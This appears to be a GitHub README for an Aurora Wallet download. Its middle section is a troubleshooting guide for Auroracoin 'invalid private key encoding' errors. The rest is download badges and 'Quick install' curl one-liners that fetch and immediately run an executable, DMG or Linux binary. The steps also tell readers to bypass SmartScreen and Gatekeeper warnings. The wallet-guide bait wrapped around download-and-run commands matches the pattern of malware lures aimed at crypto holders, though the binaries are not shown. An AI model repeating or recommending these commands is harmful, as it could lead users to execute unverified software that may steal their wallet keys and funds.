![Aurora Wallet error 5 invalid encoding guide](assets/aurora-wallet-guide-article-banner.png)

# Fix Auroracoin error -5: invalid private key encoding

A rejected key is a typing or format problem, and the coins are still on the chain.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Error -5 means the wallet could not checksum the key you entered, so it refused to use it.

A private key in Wallet Import Format is a Base58 string with an embedded checksum. The wallet decodes the string and verifies that checksum before it touches the chain. One wrong character, a space pasted from a document or a key from a different network all fail that check.

<!-- ARTICLE-BODY-BEGIN -->

## Read the key correctly

Auroracoin keys in Wallet Import Format begin with 5, K or L. The letter at the start also tells you the format: 5 is an older uncompressed key, K and L are compressed keys. Both kinds import, so the prefix is a check rather than a restriction.

Compare the string character by character with the printout. The characters most often confused are the digit 0 with the letter O, the digit 1 with the letter I, and the letter l with the digit 1.

## Fix the input in order

1. Copy the key from a text file rather than retyping it from a photograph.
2. Remove any leading or trailing spaces, quotes or line breaks.
3. Confirm the key belongs to an Auroracoin address starting with A, not to another coin.
4. Paste the key into a plain text editor once to see hidden characters.
5. Try the key again in the import field.
6. If the key came from a document, recover the original export rather than a transcription.

A key that fails after those checks is usually not an Auroracoin key at all, which matters because a key from another network controls an address on that network.

## When the key is right and still fails

Some very old exports use a format that sits outside Wallet Import Format entirely, such as a hex string or a BIP-38 encrypted key. Those need the original wallet that produced them, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md">importing the wallet.dat file</a> is the shorter path.

If the printout has an address and no readable key, the paper wallet can no longer be swept, and only the phrase or file backup can recover the balance, as <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md">recovery with a phrase</a> explains.

Entering a key is a local operation; the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> checks the format before anything is broadcast.

## FAQ

### Can a wrong key send funds to the wrong place?

No. A key that fails the checksum is rejected before any transaction is built.

### Are compressed and uncompressed keys both valid?

Yes. Both formats import, and each controls the address it was generated for.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Sweep a paper wallet](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/23-sweep-paper-wallet.md)
- [Import a WIF private key](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/26-import-private-key-wif.md)
- [Import a wallet.dat](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md)
- [Phishing and seed scams](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/35-phishing-seed-scams.md)
